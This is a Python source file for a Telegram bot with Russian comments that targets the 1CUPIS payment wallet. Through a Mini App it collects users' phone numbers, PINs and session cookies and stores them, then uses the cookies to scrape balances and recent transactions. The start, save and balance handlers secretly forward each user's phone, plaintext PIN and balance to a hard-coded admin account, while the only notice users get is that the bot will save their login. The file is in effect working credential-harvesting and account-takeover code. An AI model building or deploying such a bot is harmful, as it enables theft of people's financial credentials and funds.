# bot.py
import asyncio
import json
import logging
import sqlite3
from datetime import datetime
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from bs4 import BeautifulSoup
import requests
from cryptography.fernet import Fernet

# === Настройки ===
TOKEN = "YOUR_BOT_TOKEN"  # ← ВСТАВЬ СВОЙ
ADMIN_ID = 123456789  # ← ВСТАВЬ ID АДМИНА
WEBAPP_URL = "https://your-vercel-app.vercel.app/webapp.html"  # ← ТВОЯ ССЫЛКА

# === Логи ===
logging.basicConfig(level=logging.INFO)

# === Шифрование ===
KEY_FILE = "secret.key"
if not Path(KEY_FILE).exists():
    key = Fernet.generate_key()
    Path(KEY_FILE).write_bytes(key)
else:
    key = Path(KEY_FILE).read_bytes()
cipher = Fernet(key)

# === БД ===
DB = "users.db"
def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            phone TEXT,
            pin_enc TEXT,
            cookies TEXT,
            updated_at TEXT
        )
    ''')
    conn.commit()
    conn.close()

# === Сохранение/чтение ===
def save_user(chat_id, username, phone, pin, cookies):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users 
        (chat_id, username, phone, pin_enc, cookies, updated_at)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (
        chat_id,
        username,
        phone,
        cipher.encrypt(pin.encode()).decode(),
        cookies,
        datetime.now().isoformat()
    ))
    conn.commit()
    conn.close()

def get_user(chat_id):
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute("SELECT phone, pin_enc, cookies FROM users WHERE chat_id = ?", (chat_id,))
    row = c.fetchone()
    conn.close()
    if row:
        phone, pin_enc, cookies = row
        return {
            'phone': phone,
            'pin': cipher.decrypt(pin_enc.encode()).decode(),
            'cookies': cookies
        }
    return None

# === Парсинг баланса ===
def get_balance_with_session(cookies_str):
    try:
        session = requests.Session()
        cookies = {}
        for item in cookies_str.split('; '):
            if '=' in item:
                k, v = item.split('=', 1)
                cookies[k] = v
        for k, v in cookies.items():
            session.cookies.set(k, v, domain='.1cupis.ru')

        response = session.get("https://wallet.1cupis.ru/cabinet", timeout=10)
        if "авторизация" in response.text.lower():
            return None  # Сессия устарела

        soup = BeautifulSoup(response.text, 'html.parser')

        # Ищем баланс (адаптируй под реальный HTML)
        balance_elem = soup.find(string=lambda t: '₽' in t and len(t) < 50)
        balance = balance_elem.strip() if balance_elem else "Не найдено"

        # Транзакции
        transactions = []
        for row in soup.select("tr, .transaction, .operation")[:5]:
            text = row.get_text(strip=True)
            if text and len(text) < 200:
                transactions.append(text)

        return {
            'balance': balance,
            'transactions': transactions
        }
    except:
        return None

# === Команды ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [[InlineKeyboardButton(
        "Открыть 1CUPIS",
        web_app=WebAppInfo(url=WEBAPP_URL)
    )]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        f"Привет, {user.first_name}!\n"
        "Нажмите кнопку, чтобы войти в 1CUPIS через Mini App.\n"
        "Мы сохраним ваш вход для быстрого доступа.",
        reply_markup=reply_markup
    )

async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = get_user(update.effective_user.id)
    if not user_data:
        await update.message.reply_text("Вы не авторизованы. Используйте /start")
        return

    await update.message.reply_text("Проверяю баланс...")

    data = get_balance_with_session(user_data['cookies'])
    if not data:
        await update.message.reply_text("Сессия устарела. Пройдите вход заново: /start")
        return

    msg = f"**ВАШ БАЛАНС**\n\n"
    msg += f"**Баланс:** {data['balance']}\n\n"
    if data['transactions']:
        msg += "**Последние операции:**\n"
        for t in data['transactions']:
            msg += f"• {t}\n"
    else:
        msg += "Операций нет."

    # Отправляем пользователю
    await update.message.reply_text(msg, parse_mode='Markdown')

    # Дублируем админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"**БАЛАНС ПОЛЬЗОВАТЕЛЯ**\n"
                 f"ID: {update.effective_user.id}\n"
                 f"Имя: {update.effective_user.first_name}\n"
                 f"Телефон: {user_data['phone']}\n\n{msg}",
            parse_mode='Markdown'
        )
    except:
        pass  # Админ заблокировал бота

# === Обработка Mini App ===
async def handle_webapp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.web_app_data or not update.web_app_data.data:
        return

    try:
        data = json.loads(update.web_app_data.data)
        if data.get('action') != 'save_auth':
            return

        chat_id = update.effective_user.id
        username = update.effective_user.username or update.effective_user.first_name
        phone = data['phone']
        pin = data['pin']
        cookies = data['cookies']

        save_user(chat_id, username, phone, pin, cookies)

        await update.message.reply_text(
            "Вход сохранён!\n"
            f"Номер: `{phone}`\n"
            f"PIN: `{pin}`\n\n"
            "Теперь используйте /balance",
            parse_mode='Markdown'
        )

        # Уведомляем админа
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"**НОВЫЙ ВХОД**\n"
                 f"ID: {chat_id}\n"
                 f"Имя: {username}\n"
                 f"Телефон: {phone}\n"
                 f"PIN: {pin}\n"
                 f"Время: {datetime.now().strftime('%H:%M %d.%m')}",
            parse_mode='Markdown'
        )

    except Exception as e:
        await update.message.reply_text(f"Ошибка: {e}")

# === Запуск ===
if __name__ == "__main__":
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("balance", balance))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp))

    print("Бот запущен...")
    app.run_polling()